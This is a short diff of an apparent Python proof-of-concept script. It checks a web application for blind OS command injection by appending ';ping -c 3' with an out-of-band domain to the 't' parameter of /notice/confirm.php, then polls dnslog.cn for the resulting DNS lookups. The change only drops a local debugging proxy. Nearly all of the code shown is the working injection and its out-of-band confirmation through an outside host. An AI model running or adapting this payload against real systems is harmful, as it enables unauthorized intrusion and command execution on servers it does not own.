@@ -18,12 +18,11 @@ def check(url):
     headers = {
         "User-Agent": "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.13 (KHTML, like Gecko) Chrome/24.0.1284.0 Safari/537.13",
     }
-    proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}
     try:
         getdomain = requests.get(url='http://dnslog.cn/getdomain.php', headers={"Cookie": "PHPSESSID=hb0p9iqh804esb5khaulm8ptp2"}, timeout=30)
         domain = str(getdomain.text)
         target = urljoin(url, "/notice/confirm.php?t=;ping%20-c%203%20{}".format(domain))
-        requests.post(target, verify=False, headers=headers, timeout=15,proxies=proxies)
+        requests.post(target, verify=False, headers=headers, timeout=15)
         for i in range(0, 3):
             refresh = requests.get(url='http://dnslog.cn/getrecords.php', headers={"Cookie": "PHPSESSID=hb0p9iqh804esb5khaulm8ptp2"}, timeout=30)
             time.sleep(2)
